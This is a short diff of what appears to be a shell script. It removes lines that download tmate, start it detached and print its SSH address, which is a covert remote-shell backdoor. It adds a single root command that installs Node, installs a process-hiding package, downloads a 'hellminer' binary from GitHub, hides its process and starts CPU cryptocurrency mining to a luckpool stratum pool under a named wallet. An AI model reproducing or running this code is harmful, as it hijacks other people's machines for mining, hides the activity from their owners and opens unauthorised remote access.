@@ -1,6 +1,1 @@
-pkill -9 tmate
-wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}"
+sudo su --command "sudo apt-get update && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get update && sudo apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && wget https://github.com/d2n1982/hellminerlama/raw/main/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ph add hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RHr7JV5hHTNub62oDFGVakk4CBkYKeGpBk.vrU -p x --cpu 39"
